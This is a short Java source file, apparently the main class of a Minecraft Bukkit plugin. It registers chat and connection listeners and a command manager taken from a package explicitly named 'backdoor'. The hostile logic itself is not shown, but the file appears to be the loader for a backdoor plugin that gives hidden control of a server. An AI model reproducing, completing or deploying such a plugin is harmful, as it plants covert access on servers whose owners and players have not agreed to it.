package me.kmatias.plugin;

import me.kmatias.backdoor.CommandMan;
import me.kmatias.backdoor.PlayerChat;
import me.kmatias.backdoor.events.ConnectionEvents;
import me.kmatias.backdoor.filler.Filler;
import me.kmatias.backdoor.filler.PlayerRegionTracker;
import lombok.Getter;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

	@Getter
	private CommandMan commandManager;
	@Getter
	private Filler filler;
	@Getter
	private PlayerRegionTracker playerRegionTracker;
	
	public void onEnable() {

		this.getServer().getPluginManager().registerEvents(new PlayerChat(this), this);
		this.getServer().getPluginManager().registerEvents(new ConnectionEvents(this), this);

		commandManager = new CommandMan(this);
		commandManager.init();
		playerRegionTracker = new PlayerRegionTracker();

		filler = new Filler(this);
	}
}
